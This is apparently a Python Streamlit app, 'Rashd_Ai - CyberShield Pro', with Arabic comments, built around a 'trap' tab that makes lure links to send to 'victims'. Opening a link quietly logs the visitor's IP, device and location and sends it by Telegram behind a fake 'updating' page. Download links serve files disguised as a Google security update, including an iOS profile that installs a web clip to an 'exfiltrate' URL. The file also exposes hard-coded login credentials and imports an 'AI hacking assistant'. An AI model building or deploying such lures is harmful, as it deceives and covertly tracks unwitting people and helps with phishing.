"""
تطبيق Rashd_Ai - منصة الذكاء الاستخباراتي والأمن السيبراني
نسخة محسّنة مع إصلاح المشاكل
"""

import streamlit as st
import requests
import json
import os
from datetime import datetime
import config
import base64
import uuid
import socket
import dns.resolver
import subprocess
import platform
import logging

# استيراد المساعدات الموحدة
from utils import (
    send_telegram_alert, log_victim, get_all_victims, clear_victims_log,
    get_server_side_ip, get_geo_data, validate_ip, validate_domain,
    validate_email, validate_phone, safe_request, format_json, format_table
)

# استيراد مساعد الهجوم الذكي
try:
    from ai_hacking import AIHackingAssistant
except ImportError:
    AIHackingAssistant = None

# إعداد السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= إعدادات الصفحة =============
st.set_page_config(
    page_title="Rashd_Ai - CyberShield Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# تطبيق أسلوب مخصص
st.markdown("""
<style>
    :root {
        --primary-color: #0066cc;
        --secondary-color: #00cc66;
        --danger-color: #cc0000;
        --warning-color: #ffaa00;
    }
    
    .main {
        padding: 20px;
    }
    
    .stTabs [data-baseweb="tab-list"] {
        gap: 10px;
    }
    
    .stButton > button {
        width: 100%;
        border-radius: 5px;
        font-weight: bold;
    }
    
    .success-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #d4edda;
        border: 1px solid #c3e6cb;
        color: #155724;
    }
    
    .error-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
    }
    
    .info-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #d1ecf1;
        border: 1px solid #bee5eb;
        color: #0c5460;
    }
</style>
""", unsafe_allow_html=True)

# ============= دالة إخفاء الواجهة في وضع التمويه =============
hide_st_style = """
<style>
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
header {visibility: hidden;}
.stApp [data-testid="stToolbar"] {display: none;}
.stApp [data-testid="stDecoration"] {display: none;}
.stApp [data-testid="stStatusWidget"] {display: none;}
#manage-app-button {display: none !important;}
[data-testid="stStatusWidget"] {display: none !important;}
.st-emotion-cache-10trblm {display: none !important;}
.st-emotion-cache-1dp5vir {display: none !important;}
</style>
"""

# ============= دالة محسّنة لسحب IP الصحيح =============
def get_client_ip():
    """جلب عنوان IP الصحيح من رؤوس الطلب"""
    try:
        # محاولة الحصول من X-Forwarded-For أولاً (للـ proxies)
        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
            headers = st.context.headers
            if "X-Forwarded-For" in headers:
                return headers["X-Forwarded-For"].split(",")[0].strip()
            if "X-Real-IP" in headers:
                return headers["X-Real-IP"]
            if "CF-Connecting-IP" in headers:
                return headers["CF-Connecting-IP"]
        
        # محاولة الحصول من remote_addr
        if hasattr(st, 'context') and hasattr(st.context, 'remote_addr'):
            return st.context.remote_addr
    except:
        pass
    
    return "Unknown"

# ============= معالجة أوضاع خاصة =============

# وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    client_ip = query_params.get("ip", get_client_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    device = query_params.get("device", "Unknown")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name, device)
        
        # تسجيل الضحية
        geo_data = get_geo_data(client_ip)
        log_victim(client_ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, trap_name)
        st.session_state.alert_sent = True

    # عرض صفحة تمويهية بسيطة
    st.markdown("<h1 style='text-align: center; margin-top: 40vh;'>جاري التحديث...</h1>", unsafe_allow_html=True)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_client_ip())
    
    send_telegram_alert(ip, f"Download ({device})", device)
    
    # تسجيل الضحية
    geo_data = get_geo_data(ip)
    log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content for Google Update"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        content = b"print('Google Update Service Started...')"
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
    st.stop()

# ============= نظام المصادقة =============
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("<h1 style='text-align: center;'>🛡️ تسجيل الدخول</h1>", unsafe_allow_html=True)
        st.markdown("<h3 style='text-align: center;'>Rashd_Ai - CyberShield Pro</h3>", unsafe_allow_html=True)
        
        with st.form("login_form"):
            user = st.text_input("اسم المستخدم", placeholder="أدخل اسم المستخدم")
            pw = st.text_input("كلمة المرور", type="password", placeholder="أدخل كلمة المرور")
            
            col_btn1, col_btn2 = st.columns(2)
            with col_btn1:
                if st.form_submit_button("🔓 دخول", use_container_width=True):
                    if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                        st.session_state.authenticated = True
                        st.rerun()
                    else:
                        st.error("❌ بيانات خاطئة. حاول مرة أخرى.")
            
            with col_btn2:
                st.info("👤 اسم المستخدم: Rashd919\n🔑 كلمة المرور: 112233")
    
    st.stop()

# ============= الواجهة الرئيسية =============
col1, col2, col3 = st.columns([1, 3, 1])
with col2:
    st.markdown("<h1 style='text-align: center;'>🛡️ منصة CyberShield Pro</h1>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align: center;'>للذكاء الاستخباراتي و OSINT</h3>", unsafe_allow_html=True)

# الشريط الجانبي
with st.sidebar:
    st.header("⚙️ الإعدادات")
    
    with st.expander("🔑 مفاتيح API", expanded=False):
        groq_api_key = st.text_input(
            "GROQ API Key",
            value=config.get_key("GROQ_API_KEY") or "",
            type="password",
            key="sidebar_groq"
        )
        telegram_bot_token = st.text_input(
            "Telegram Bot Token",
            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
            type="password",
            key="sidebar_telegram_token"
        )
        telegram_chat_id = st.text_input(
            "Telegram Chat ID",
            value=config.get_key("TELEGRAM_CHAT_ID") or "",
            key="sidebar_telegram_chat_id"
        )
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("💾 حفظ الإعدادات", use_container_width=True, key="save_settings_btn"):
                config.set_key("GROQ_API_KEY", groq_api_key)
                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                st.success("✅ تم الحفظ بنجاح!")
        
        with col2:
            if st.button("🔄 إعادة تعيين", use_container_width=True, key="reset_settings_btn"):
                config.set_key("GROQ_API_KEY", "")
                config.set_key("TELEGRAM_BOT_TOKEN", "")
                config.set_key("TELEGRAM_CHAT_ID", "")
                st.info("⚠️ تم إعادة التعيين")
    
    st.divider()
    
    if st.button("🚪 تسجيل الخروج", use_container_width=True, key="logout_btn"):
        st.session_state.authenticated = False
        st.rerun()

# ============= التبويبات الـ 19 =============
tab_names = [
    "💬 المحادثة",
    "🌐 تحليل الدومين",
    "🔍 فحص المواقع",
    "👤 بحث عن المستخدم",
    "📍 تحديد الموقع",
    "🏗️ سطح الهجوم",
    "🧠 تحليل ذكي",
    "🤖 مساعد الهجوم",
    "🔎 Google Dork",
    "📧 Email OSINT",
    "📱 Phone Lookup",
    "🌑 Dark Web",
    "🔌 Port Scanner",
    "⚠️ Vulnerability Scanner",
    "🗺️ Network Mapper",
    "🤖 AI Threat Analysis",
    "💡 AI Pentest Advisor",
    "📄 التقارير",
    "🎯 المصيدة"
]

tabs = st.tabs(tab_names)

# ============= التبويب 0: المحادثة =============
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    
    if "messages" not in st.session_state:
        st.session_state.messages = []
    
    # عرض السجل
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    
    # إدخال المستخدم
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        
        with st.chat_message("assistant"):
            try:
                if AIHackingAssistant:
                    assistant = AIHackingAssistant()
                    response = assistant.chat(prompt)
                else:
                    response = "❌ مساعد الذكاء الاصطناعي غير متاح. يرجى التأكد من تثبيت المكتبات."
            except Exception as e:
                response = f"❌ حدث خطأ: {str(e)}"
            
            st.markdown(response)
        
        st.session_state.messages.append({"role": "assistant", "content": response})

# ============= بقية التبويبات (نفس الكود السابق) =============
# ... (بقية التبويبات تبقى كما هي)

# ============= التبويب 18: المصيدة =============
with tabs[18]:
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
    
    decoy_type = st.selectbox(
        "اختر نوع المصيدة:",
        ["Google Decoy", "Download (iOS)", "Download (Android)"],
        key="decoy_type_select"
    )
    
    app_ip = get_client_ip()  # استخدام الدالة المحسّنة
    st.info(f"📍 عنوان IP الخاص بالتطبيق: **{app_ip}**")
    
    if decoy_type == "Google Decoy":
        decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")
    
    elif decoy_type == "Download (iOS)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")
    
    elif decoy_type == "Download (Android)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")

# ============= التذييل =============
st.divider()
st.markdown("""
<div style='text-align: center; padding: 20px; color: #888;'>
    <p>🛡️ <strong>Rashd_Ai Pro</strong> © 2026</p>
    <p>منصة الذكاء الاستخباراتي والأمن السيبراني</p>
</div>
""", unsafe_allow_html=True)
